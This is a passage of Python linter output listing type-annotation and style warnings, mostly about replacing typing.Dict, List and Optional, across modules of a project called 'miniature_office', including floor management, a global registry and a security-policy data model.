    |                                                     ^^^^
907 |         """
908 |         Verify human supremacy is maintained:
    |
help: Replace with `list`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\core\expanded_autonomy.py:918:13
    |
916 |           # Check promotions
917 |           for sandbox in self.sandbox_manager.sandboxes.values():
918 | /             if sandbox.status == SandboxStatus.PROMOTED:
919 | |                 if not sandbox.promoted_to_directive_id:
    | |________________________________________________________^
920 |                       violations.append(
921 |                           f"Sandbox {sandbox.branch_id} promoted without directive"
    |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:943:41
    |
941 |         return (len(violations) == 0, violations)
942 |
943 |     def verify_stop_conditions(self) -> Dict[str, bool]:
    |                                         ^^^^
944 |         """
945 |         Verify all stop conditions are met:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\expanded_autonomy.py:1033:27
     |
1032 | # Global instance
1033 | _expanded_autonomy_model: Optional[ExpandedAutonomyModel] = None
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\floor_manager.py:11:1
   |
 9 | import subprocess
10 | from pathlib import Path
11 | from typing import Any, Dict, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\floor_manager.py:23:36
   |
22 |     def send_request(
23 |         self, method: str, params: Optional[Dict[str, Any]] = None
   |                                    ^^^^^^^^^^^^^^^^^^^^^^^^
24 |     ) -> Dict[str, Any]:
25 |         """Send a JSON-RPC request to the floor process"""
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\floor_manager.py:23:45
   |
22 |     def send_request(
23 |         self, method: str, params: Optional[Dict[str, Any]] = None
   |                                             ^^^^
24 |     ) -> Dict[str, Any]:
25 |         """Send a JSON-RPC request to the floor process"""
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\floor_manager.py:24:10
   |
22 |     def send_request(
23 |         self, method: str, params: Optional[Dict[str, Any]] = None
24 |     ) -> Dict[str, Any]:
   |          ^^^^
25 |         """Send a JSON-RPC request to the floor process"""
26 |         request = {"method": method}
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\floor_manager.py:65:29
   |
63 |     def __init__(self, floors_dir: str = "floors"):
64 |         self.floors_dir = Path(floors_dir)
65 |         self.active_floors: Dict[str, FloorProcess] = {}
   |                             ^^^^
66 |         self.floor_configs = {
67 |             "python": {
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\floor_manager.py:158:48
    |
156 |             self.stop_floor(language)
157 |
158 |     def get_floor_info(self, language: str) -> Optional[Dict[str, Any]]:
    |                                                ^^^^^^^^^^^^^^^^^^^^^^^^
159 |         """Get information about a floor"""
160 |         if language not in self.active_floors:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\floor_manager.py:158:57
    |
156 |             self.stop_floor(language)
157 |
158 |     def get_floor_info(self, language: str) -> Optional[Dict[str, Any]]:
    |                                                         ^^^^
159 |         """Get information about a floor"""
160 |         if language not in self.active_floors:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\floor_manager.py:166:51
    |
165 |     def send_request_to_floor(
166 |         self, language: str, method: str, params: Optional[Dict[str, Any]] = None
    |                                                   ^^^^^^^^^^^^^^^^^^^^^^^^
167 |     ) -> Optional[Dict[str, Any]]:
168 |         """Send a request to a specific floor"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\floor_manager.py:166:60
    |
165 |     def send_request_to_floor(
166 |         self, language: str, method: str, params: Optional[Dict[str, Any]] = None
    |                                                            ^^^^
167 |     ) -> Optional[Dict[str, Any]]:
168 |         """Send a request to a specific floor"""
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\floor_manager.py:167:10
    |
165 |     def send_request_to_floor(
166 |         self, language: str, method: str, params: Optional[Dict[str, Any]] = None
167 |     ) -> Optional[Dict[str, Any]]:
    |          ^^^^^^^^^^^^^^^^^^^^^^^^
168 |         """Send a request to a specific floor"""
169 |         if language not in self.active_floors:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\floor_manager.py:167:19
    |
165 |     def send_request_to_floor(
166 |         self, language: str, method: str, params: Optional[Dict[str, Any]] = None
167 |     ) -> Optional[Dict[str, Any]]:
    |                   ^^^^
168 |         """Send a request to a specific floor"""
169 |         if language not in self.active_floors:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\floor_manager.py:175:37
    |
173 |         return self.active_floors[language].send_request(method, params)
174 |
175 |     def get_all_floor_info(self) -> Dict[str, Any]:
    |                                     ^^^^
176 |         """Get information about all running floors"""
177 |         info = {}
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\floor_specifications.py:16:1
   |
14 | from dataclasses import dataclass, field
15 | from enum import Enum
16 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\floor_specifications.py:16:1
   |
14 | from dataclasses import dataclass, field
15 | from enum import Enum
16 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> src\app\miniature_office\core\floor_specifications.py:16:1
   |
14 | from dataclasses import dataclass, field
15 | from enum import Enum
16 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\floor_specifications.py:77:20
   |
75 |     """Security concerns specific to a language"""
76 |
77 |     primary_risks: List[str] = field(default_factory=list)
   |                    ^^^^
78 |     required_checks: List[str] = field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\floor_specifications.py:78:22
   |
77 |     primary_risks: List[str] = field(default_factory=list)
78 |     required_checks: List[str] = field(default_factory=list)
   |                      ^^^^
79 |
80 |     def to_dict(self) -> Dict:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\floor_specifications.py:80:26
   |
78 |     required_checks: List[str] = field(default_factory=list)
79 |
80 |     def to_dict(self) -> Dict:
   |                          ^^^^
81 |         return {
82 |             "primary_risks": self.primary_risks,
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\floor_specifications.py:91:22
   |
89 |     """Testing requirements for a language"""
90 |
91 |     mandatory_tests: List[str] = field(default_factory=list)
   |                      ^^^^
92 |     optional_tests: List[str] = field(default_factory=list)
93 |     special_emphasis: List[str] = field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\floor_specifications.py:92:21
   |
91 |     mandatory_tests: List[str] = field(default_factory=list)
92 |     optional_tests: List[str] = field(default_factory=list)
   |                     ^^^^
93 |     special_emphasis: List[str] = field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\floor_specifications.py:93:23
   |
91 |     mandatory_tests: List[str] = field(default_factory=list)
92 |     optional_tests: List[str] = field(default_factory=list)
93 |     special_emphasis: List[str] = field(default_factory=list)
   |                       ^^^^
94 |
95 |     def to_dict(self) -> Dict:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\floor_specifications.py:95:26
   |
93 |     special_emphasis: List[str] = field(default_factory=list)
94 |
95 |     def to_dict(self) -> Dict:
   |                          ^^^^
96 |         return {
97 |             "mandatory_tests": self.mandatory_tests,
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\floor_specifications.py:118:13
    |
116 |     language: ProgrammingLanguage
117 |     floor_number: int
118 |     domain: List[str]  # What this floor handles
    |             ^^^^
119 |     architectural_constraints: List[str]
120 |     security_focus: SecurityFocus
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\floor_specifications.py:119:32
    |
117 |     floor_number: int
118 |     domain: List[str]  # What this floor handles
119 |     architectural_constraints: List[str]
    |                                ^^^^
120 |     security_focus: SecurityFocus
121 |     testing_doctrine: TestingDoctrine
    |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\floor_specifications.py:124:25
    |
123 |     # Jurisdiction laws
124 |     can_emit_languages: Set[ProgrammingLanguage] = field(default_factory=set)
    |                         ^^^
125 |     can_reason_about: Set[ProgrammingLanguage] = field(default_factory=set)
126 |     requires_contracts_for: Set[ProgrammingLanguage] = field(default_factory=set)
    |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\floor_specifications.py:125:23
    |
123 |     # Jurisdiction laws
124 |     can_emit_languages: Set[ProgrammingLanguage] = field(default_factory=set)
125 |     can_reason_about: Set[ProgrammingLanguage] = field(default_factory=set)
    |                       ^^^
126 |     requires_contracts_for: Set[ProgrammingLanguage] = field(default_factory=set)
    |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\floor_specifications.py:126:29
    |
124 |     can_emit_languages: Set[ProgrammingLanguage] = field(default_factory=set)
125 |     can_reason_about: Set[ProgrammingLanguage] = field(default_factory=set)
126 |     requires_contracts_for: Set[ProgrammingLanguage] = field(default_factory=set)
    |                             ^^^
127 |
128 |     def __post_init__(self):
    |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\floor_specifications.py:152:22
    |
150 |     def validate_jurisdiction(
151 |         self, action: str, target_language: ProgrammingLanguage
152 |     ) -> tuple[bool, Optional[str]]:
    |                      ^^^^^^^^^^^^^
153 |         """
154 |         Validate if an action is legal under jurisdiction laws.
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\floor_specifications.py:180:26
    |
178 |         return True, None
179 |
180 |     def to_dict(self) -> Dict:
    |                          ^^^^
181 |         return {
182 |             "language": self.language.value,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\floor_specifications.py:872:13
    |
871 | # Registry of all floors
872 | ALL_FLOORS: Dict[ProgrammingLanguage, FloorSpecification] = {
    |             ^^^^
873 |     ProgrammingLanguage.PYTHON: FLOOR_1_PYTHON,
874 |     ProgrammingLanguage.RUST: FLOOR_2_RUST,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\floor_specifications.py:926:25
    |
926 | def get_all_floors() -> List[FloorSpecification]:
    |                         ^^^^
927 |     """Get all floor specifications"""
928 |     return list(ALL_FLOORS.values())
    |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\global_registry.py:16:1
   |
14 | from datetime import datetime
15 | from enum import Enum
16 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\global_registry.py:16:1
   |
14 | from datetime import datetime
15 | from enum import Enum
16 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> src\app\miniature_office\core\global_registry.py:16:1
   |
14 | from datetime import datetime
15 | from enum import Enum
16 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\global_registry.py:51:19
   |
49 |     name: str
50 |     role: str
51 |     capabilities: List[str]
   |                   ^^^^
52 |     floor: str
53 |     registered_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\global_registry.py:55:26
   |
53 |     registered_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
54 |
55 |     def to_dict(self) -> Dict[str, Any]:
   |                          ^^^^
56 |         return asdict(self)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\global_registry.py:68:15
   |
66 |     domain: str
67 |     status: FloorStatus
68 |     services: List[ServiceType]
   |               ^^^^
69 |     agents: List[str] = field(default_factory=list)
70 |     endpoint: Optional[str] = None
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\global_registry.py:69:13
   |
67 |     status: FloorStatus
68 |     services: List[ServiceType]
69 |     agents: List[str] = field(default_factory=list)
   |             ^^^^
70 |     endpoint: Optional[str] = None
71 |     process_id: Optional[int] = None
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\global_registry.py:70:15
   |
68 |     services: List[ServiceType]
69 |     agents: List[str] = field(default_factory=list)
70 |     endpoint: Optional[str] = None
   |               ^^^^^^^^^^^^^
71 |     process_id: Optional[int] = None
72 |     registered_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\global_registry.py:71:17
   |
69 |     agents: List[str] = field(default_factory=list)
70 |     endpoint: Optional[str] = None
71 |     process_id: Optional[int] = None
   |                 ^^^^^^^^^^^^^
72 |     registered_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
73 |     last_heartbeat: str = field(default_factory=lambda: datetime.utcnow().isoformat())
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\global_registry.py:74:15
   |
72 |     registered_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
73 |     last_heartbeat: str = field(default_factory=lambda: datetime.utcnow().isoformat())
74 |     metadata: Dict[str, Any] = field(default_factory=dict)
   |               ^^^^
75 |
76 |     def to_dict(self) -> Dict[str, Any]:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\global_registry.py:76:26
   |
74 |     metadata: Dict[str, Any] = field(default_factory=dict)
75 |
76 |     def to_dict(self) -> Dict[str, Any]:
   |                          ^^^^
77 |         data = asdict(self)
78 |         data["status"] = self.status.value
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\global_registry.py:96:22
   |
95 |     def __init__(self):
96 |         self.floors: Dict[str, FloorRegistration] = {}
   |                      ^^^^
97 |         self.agents: Dict[str, AgentRegistration] = {}
98 |         self.service_index: Dict[ServiceType, Set[str]] = {
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\global_registry.py:97:22
   |
95 |     def __init__(self):
96 |         self.floors: Dict[str, FloorRegistration] = {}
97 |         self.agents: Dict[str, AgentRegistration] = {}
   |                      ^^^^
98 |         self.service_index: Dict[ServiceType, Set[str]] = {
99 |             service: set() for service in ServiceType
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\global_registry.py:98:29
    |
 96 |         self.floors: Dict[str, FloorRegistration] = {}
 97 |         self.agents: Dict[str, AgentRegistration] = {}
 98 |         self.service_index: Dict[ServiceType, Set[str]] = {
    |                             ^^^^
 99 |             service: set() for service in ServiceType
100 |         }
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\global_registry.py:98:47
    |
 96 |         self.floors: Dict[str, FloorRegistration] = {}
 97 |         self.agents: Dict[str, AgentRegistration] = {}
 98 |         self.service_index: Dict[ServiceType, Set[str]] = {
    |                                               ^^^
 99 |             service: set() for service in ServiceType
100 |         }
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\global_registry.py:117:19
    |
115 |         language: str,
116 |         domain: str,
117 |         services: List[ServiceType],
    |                   ^^^^
118 |         endpoint: Optional[str] = None,
119 |         process_id: Optional[int] = None,
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\global_registry.py:118:19
    |
116 |         domain: str,
117 |         services: List[ServiceType],
118 |         endpoint: Optional[str] = None,
    |                   ^^^^^^^^^^^^^
119 |         process_id: Optional[int] = None,
120 |         metadata: Optional[Dict[str, Any]] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\global_registry.py:119:21
    |
117 |         services: List[ServiceType],
118 |         endpoint: Optional[str] = None,
119 |         process_id: Optional[int] = None,
    |                     ^^^^^^^^^^^^^
120 |         metadata: Optional[Dict[str, Any]] = None,
121 |     ) -> FloorRegistration:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\global_registry.py:120:19
    |
118 |         endpoint: Optional[str] = None,
119 |         process_id: Optional[int] = None,
120 |         metadata: Optional[Dict[str, Any]] = None,
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^
121 |     ) -> FloorRegistration:
122 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\global_registry.py:120:28
    |
118 |         endpoint: Optional[str] = None,
119 |         process_id: Optional[int] = None,
120 |         metadata: Optional[Dict[str, Any]] = None,
    |                            ^^^^
121 |     ) -> FloorRegistration:
122 |         """
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\global_registry.py:167:23
    |
165 |         name: str,
166 |         role: str,
167 |         capabilities: List[str],
    |                       ^^^^
168 |         floor_id: str,
169 |     ) -> AgentRegistration:
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\global_registry.py:212:43
    |
210 |             self.floors[floor_id].last_heartbeat = datetime.utcnow().isoformat()
211 |
212 |     def get_floor(self, floor_id: str) -> Optional[FloorRegistration]:
    |                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
213 |         """Get floor registration by ID"""
214 |         with self._lock:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\global_registry.py:217:43
    |
215 |             return self.floors.get(floor_id)
216 |
217 |     def get_agent(self, agent_id: str) -> Optional[AgentRegistration]:
    |                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
218 |         """Get agent registration by ID"""
219 |         with self._lock:
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\global_registry.py:222:57
    |
220 |             return self.agents.get(agent_id)
221 |
222 |     def find_floors_by_language(self, language: str) -> List[FloorRegistration]:
    |                                                         ^^^^
223 |         """Find all floors for a specific language"""
224 |         with self._lock:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\global_registry.py:231:63
    |
229 |             ]
230 |
231 |     def find_floors_by_service(self, service: ServiceType) -> List[FloorRegistration]:
    |                                                               ^^^^
232 |         """Find all floors that provide a specific service"""
233 |         with self._lock:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\global_registry.py:239:10
    |
237 |     def find_ready_floors_by_service(
238 |         self, service: ServiceType
239 |     ) -> List[FloorRegistration]:
    |          ^^^^
240 |         """Find all ready floors that provide a specific service"""
241 |         floors = self.find_floors_by_service(service)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\global_registry.py:244:33
    |
242 |         return [floor for floor in floors if floor.status == FloorStatus.READY]
243 |
244 |     def get_all_floors(self) -> List[FloorRegistration]:
    |                                 ^^^^
245 |         """Get all registered floors"""
246 |         with self._lock:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\global_registry.py:249:33
    |
247 |             return list(self.floors.values())
248 |
249 |     def get_all_agents(self) -> List[AgentRegistration]:
    |                                 ^^^^
250 |         """Get all registered agents"""
251 |         with self._lock:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\global_registry.py:254:53
    |
252 |             return list(self.agents.values())
253 |
254 |     def get_agents_by_floor(self, floor_id: str) -> List[AgentRegistration]:
    |                                                     ^^^^
255 |         """Get all agents for a specific floor"""
256 |         with self._lock:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\global_registry.py:320:37
    |
318 |             return True
319 |
320 |     def get_registry_stats(self) -> Dict[str, Any]:
    |                                     ^^^^
321 |         """Get statistics about the registry"""
322 |         with self._lock:
    |
help: Replace with `dict`

C401 Unnecessary generator (rewrite as a set comprehension)
   --> src\app\miniature_office\core\global_registry.py:338:21
    |
336 |                 "floors_by_service": service_counts,
337 |                 "languages": list(
338 |                     set(floor.language for floor in self.floors.values())
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
339 |                 ),
340 |             }
    |
help: Rewrite as a set comprehension

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\global_registry.py:342:34
    |
340 |             }
341 |
342 |     def export_registry(self) -> Dict[str, Any]:
    |                                  ^^^^
343 |         """Export the entire registry as JSON-serializable dict"""
344 |         with self._lock:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\global_registry.py:352:37
    |
350 |             }
351 |
352 |     def import_registry(self, data: Dict[str, Any]) -> None:
    |                                     ^^^^
353 |         """Import registry from exported data (for persistence)"""
354 |         with self._lock:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\global_registry.py:381:19
    |
380 | # Global singleton instance
381 | _global_registry: Optional[GlobalRegistry] = None
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\head_of_security.py:30:1
   |
28 | from datetime import datetime
29 | from enum import Enum
30 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\head_of_security.py:30:1
   |
28 | from datetime import datetime
29 | from enum import Enum
30 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\head_of_security.py:74:24
   |
72 |     description: str
73 |     threat_level: ThreatLevel
74 |     affected_entities: List[str] = field(default_factory=list)
   |                        ^^^^
75 |     mitigations: List[str] = field(default_factory=list)
76 |     residual_risk: str = ""
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\head_of_security.py:75:18
   |
73 |     threat_level: ThreatLevel
74 |     affected_entities: List[str] = field(default_factory=list)
75 |     mitigations: List[str] = field(default_factory=list)
   |                  ^^^^
76 |     residual_risk: str = ""
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\head_of_security.py:78:26
   |
76 |     residual_risk: str = ""
77 |
78 |     def to_dict(self) -> Dict:
   |                          ^^^^
79 |         return {
80 |             "threat_id": self.threat_id,
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\head_of_security.py:97:12
   |
95 |     name: str
96 |     description: str
97 |     rules: List[str] = field(default_factory=list)
   |            ^^^^
98 |     enforcement_level: str = "MANDATORY"  # ADVISORY, MANDATORY, CRITICAL
99 |     exceptions: List[str] = field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:99:17
    |
 97 |     rules: List[str] = field(default_factory=list)
 98 |     enforcement_level: str = "MANDATORY"  # ADVISORY, MANDATORY, CRITICAL
 99 |     exceptions: List[str] = field(default_factory=list)
    |                 ^^^^
100 |
101 |     def to_dict(self) -> Dict:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:101:26
    |
 99 |     exceptions: List[str] = field(default_factory=list)
100 |
101 |     def to_dict(self) -> Dict:
    |                          ^^^^
102 |         return {
103 |             "policy_id": self.policy_id,
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\head_of_security.py:123:17
    |
121 |     justification: str
122 |     granted_at: datetime = field(default_factory=datetime.now)
123 |     expires_at: Optional[datetime] = None
    |                 ^^^^^^^^^^^^^^^^^^
124 |
125 |     def is_active(self) -> bool:
    |
help: Convert to `X | None`

SIM103 Return the negated condition directly
   --> src\app\miniature_office\core\head_of_security.py:129:9
    |
127 |           if not self.granted:
128 |               return False
129 | /         if self.expires_at and datetime.now() > self.expires_at:
130 | |             return False
131 | |         return True
    | |___________________^
132 |
133 |       def to_dict(self) -> Dict:
    |
help: Inline condition

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:133:26
    |
131 |         return True
132 |
133 |     def to_dict(self) -> Dict:
    |                          ^^^^
134 |         return {
135 |             "permission_id": self.permission_id,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:153:12
    |
151 |     audit_id: str
152 |     audit_type: str  # "full_system", "floor", "cross_floor", "artifact"
153 |     scope: List[str] = field(default_factory=list)
    |            ^^^^
154 |     findings: List[str] = field(default_factory=list)
155 |     recommendations: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:154:15
    |
152 |     audit_type: str  # "full_system", "floor", "cross_floor", "artifact"
153 |     scope: List[str] = field(default_factory=list)
154 |     findings: List[str] = field(default_factory=list)
    |               ^^^^
155 |     recommendations: List[str] = field(default_factory=list)
156 |     threat_level: ThreatLevel = ThreatLevel.LOW
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:155:22
    |
153 |     scope: List[str] = field(default_factory=list)
154 |     findings: List[str] = field(default_factory=list)
155 |     recommendations: List[str] = field(default_factory=list)
    |                      ^^^^
156 |     threat_level: ThreatLevel = ThreatLevel.LOW
157 |     started_at: datetime = field(default_factory=datetime.now)
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\head_of_security.py:158:19
    |
156 |     threat_level: ThreatLevel = ThreatLevel.LOW
157 |     started_at: datetime = field(default_factory=datetime.now)
158 |     completed_at: Optional[datetime] = None
    |                   ^^^^^^^^^^^^^^^^^^
159 |
160 |     def to_dict(self) -> Dict:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:160:26
    |
158 |     completed_at: Optional[datetime] = None
159 |
160 |     def to_dict(self) -> Dict:
    |                          ^^^^
161 |         return {
162 |             "audit_id": self.audit_id,
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\head_of_security.py:185:16
    |
183 |     threat_level: ThreatLevel
184 |     initiated_at: datetime = field(default_factory=datetime.now)
185 |     lifted_at: Optional[datetime] = None
    |                ^^^^^^^^^^^^^^^^^^
186 |
187 |     def is_active(self) -> bool:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:190:26
    |
188 |         return self.lifted_at is None
189 |
190 |     def to_dict(self) -> Dict:
    |                          ^^^^
191 |         return {
192 |             "lockdown_id": self.lockdown_id,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:209:27
    |
207 |     artifact_id: str
208 |     reason: str
209 |     required_mitigations: List[str] = field(default_factory=list)
    |                           ^^^^
210 |     blocked_at: datetime = field(default_factory=datetime.now)
211 |     unblocked_at: Optional[datetime] = None
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\head_of_security.py:211:19
    |
209 |     required_mitigations: List[str] = field(default_factory=list)
210 |     blocked_at: datetime = field(default_factory=datetime.now)
211 |     unblocked_at: Optional[datetime] = None
    |                   ^^^^^^^^^^^^^^^^^^
212 |
213 |     def is_blocked(self) -> bool:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
